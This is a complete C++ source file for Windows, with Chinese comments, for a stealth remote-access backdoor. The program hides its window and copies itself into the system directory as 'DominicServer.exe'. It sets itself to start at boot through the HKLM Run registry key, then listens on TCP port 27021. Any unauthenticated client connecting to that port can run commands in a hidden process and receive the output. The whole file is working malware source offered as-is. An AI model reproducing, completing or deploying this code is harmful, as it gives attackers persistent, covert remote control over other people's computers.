#define _CRT_SECURE_NO_WARNINGS // 避免安全警告
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <filesystem>
#include <thread>
#include <shlobj.h>
#include <algorithm>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Advapi32.lib")

// 执行命令并返回其输出
std::string executeCommand(const std::string& cmd) {
    std::string commandOutput;
    SECURITY_ATTRIBUTES saAttr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    HANDLE hReadPipe, hWritePipe;

    // 设置安全属性
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // 创建管道
    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0)) {
        std::cerr << "Failed to create pipe.\n";
        return "";
    }

    // 禁用控制台窗口
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // 隐藏窗口
    si.hStdOutput = hWritePipe; // 标准输出重定向到管道写端
    si.hStdError = hWritePipe;  // 标准错误重定向到管道写端

    // 准备进程信息
    ZeroMemory(&pi, sizeof(pi));

    // 启动子进程
    if (!CreateProcessA(NULL,
        const_cast<char*>(cmd.c_str()),
        NULL,
        NULL,
        TRUE,
        CREATE_NO_WINDOW, // 创建时不显示窗口
        NULL,
        NULL,
        &si,
        &pi)) {
        std::cerr << "CreateProcess failed (" << GetLastError() << ").\n";
        return "";
    }

    // 关闭写端，只读取
    CloseHandle(hWritePipe);

    // 读取管道输出
    CHAR chBuf[256];
    DWORD bytesRead;
    while (ReadFile(hReadPipe, chBuf, sizeof(chBuf) - 1, &bytesRead, NULL)) {
        if (bytesRead == 0)
            break;
        chBuf[bytesRead] = '\0';
        commandOutput += chBuf;
    }

    // 等待子进程结束
    WaitForSingleObject(pi.hProcess, INFINITE);

    // 清理资源
    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return commandOutput;
}


// 将消息写入日志文件
void writeLog(const std::string& message) {
    std::filesystem::path exePath = std::filesystem::current_path();
    std::ofstream logFile(exePath / "log.txt", std::ios::app);

    if (!logFile) {
        std::cerr << "Failed to open log file!" << std::endl;
        return;
    }

    logFile << message << std::endl;
}

// 检查程序是否以管理员权限运行
bool isElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

// 将程序复制到系统目录
bool copyToSystemDirectory() {
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);

    wchar_t currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    std::filesystem::path targetPath = std::filesystem::path(systemDir) / L"DominicServer.exe";

    try {
        std::filesystem::copy(currentExePath, targetPath, std::filesystem::copy_options::overwrite_existing);
        return true;
    }
    catch (const std::filesystem::filesystem_error& e) {
        std::wcerr << L"Copy to system directory failed: " << e.what() << std::endl;
        return false;
    }
}

// 将程序添加到开机启动项
bool addToStartup() {
    HKEY hKey;
    const wchar_t* czStartName = L"DominicServer";
    wchar_t pathToExe[MAX_PATH];
    GetModuleFileNameW(NULL, pathToExe, MAX_PATH);

    if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        if (RegSetValueExW(hKey, czStartName, 0, REG_SZ, (LPBYTE)pathToExe, (wcslen(pathToExe) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    return false;
}

// 忽略大小写的字符串比较
bool caseInsensitiveCompare(const std::string& str1, const std::string& str2) {
    std::string lowerStr1 = str1;
    std::string lowerStr2 = str2;

    std::transform(lowerStr1.begin(), lowerStr1.end(), lowerStr1.begin(), ::tolower);
    std::transform(lowerStr2.begin(), lowerStr2.end(), lowerStr2.begin(), ::tolower);

    return lowerStr1 == lowerStr2;
}

// 检查并设置程序到系统目录和开机启动项
void checkAndSetup() {
    wchar_t systemDir[MAX_PATH];
    GetSystemDirectoryW(systemDir, MAX_PATH);

    wchar_t currentExePath[MAX_PATH];
    GetModuleFileNameW(NULL, currentExePath, MAX_PATH);

    std::filesystem::path exePath(currentExePath);
    std::filesystem::path systemPath(systemDir);
    std::filesystem::path targetPath = systemPath / exePath.filename();

    if (!caseInsensitiveCompare(exePath.parent_path().string(), systemPath.string())) {
        if (isElevated()) {
            if (copyToSystemDirectory()) {
                ShellExecuteW(NULL, L"open", targetPath.wstring().c_str(), NULL, NULL, SW_HIDE);
            }
        }
        else {
            std::cerr << "Please run the program as administrator to move it to the system directory." << std::endl;
        }
    }

    HKEY hKey;
    const wchar_t* czStartName = L"DominicServer";
    if (RegOpenKeyW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        DWORD size = 0;
        if (RegQueryValueExW(hKey, czStartName, NULL, NULL, NULL, &size) != ERROR_SUCCESS || size == 0) {
            addToStartup();
        }
        RegCloseKey(hKey);
    }
}

// 处理客户端连接，接收命令并返回执行结果
void handleClient(SOCKET clientSocket) {
    char buffer[1024];
    int bytesReceived;

    while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0)) > 0) {
        buffer[bytesReceived] = '\0';
        std::string command(buffer);

        // 执行命令并获取结果
        std::string result = executeCommand(command.c_str());

        // 发送结果到客户端
        send(clientSocket, result.c_str(), result.size(), 0);
    }

    closesocket(clientSocket);
}

// 程序入口
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) {
        ShowWindow(hwnd, SW_HIDE); // 如果控制台窗口存在，隐藏它
    }

    // 自动启设置
    checkAndSetup();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed!" << std::endl;
        return 1;
    }

    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed!" << std::endl;
        WSACleanup();
        return 1;
    }

    sockaddr_in serverAddr = {};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(27021);

    if (bind(listenSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Bind failed!" << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    if (listen(listenSocket, 1) == SOCKET_ERROR) {
        std::cerr << "Listen failed!" << std::endl;
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    while (true) {
        SOCKET clientSocket = accept(listenSocket, NULL, NULL);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Accept failed!" << std::endl;
            closesocket(listenSocket);
            WSACleanup();
            return 1;
        }

        std::thread(handleClient, clientSocket).detach();
    }

    closesocket(listenSocket);
    WSACleanup();

    return 0;
}
